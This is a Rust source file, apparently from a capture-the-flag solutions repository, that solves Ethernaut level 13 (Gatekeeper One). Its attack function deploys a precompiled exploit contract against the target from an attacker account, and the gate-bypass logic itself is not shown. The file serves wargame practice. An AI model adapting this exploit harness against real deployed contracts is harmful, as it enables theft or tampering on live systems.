//! Ethernaut 13 — Gatekeeper One.
//!
//! Goal: Pass all three gates of `GatekeeperOne` and register your offender
//! account as its `entrant`.
//!
//! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/levels/GatekeeperOne.sol

use async_trait::async_trait;
use ctf::Actor;
use ctf::ethereum::ethernaut::lvl13_gatekeeper_one::*;

pub struct Exploit;

alloy::sol!(
    #[sol(rpc)]
    GatekeeperOneExploit,
    "out/GatekeeperOneExploit.sol/GatekeeperOneExploit.json"
);

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        GatekeeperOneExploit::deploy_builder(
            offender.provider(),
            target.address,
        )
        .gas(1_000_000)
        .from(offender.address())
        .deploy()
        .await?;

        Ok(())
    }
}
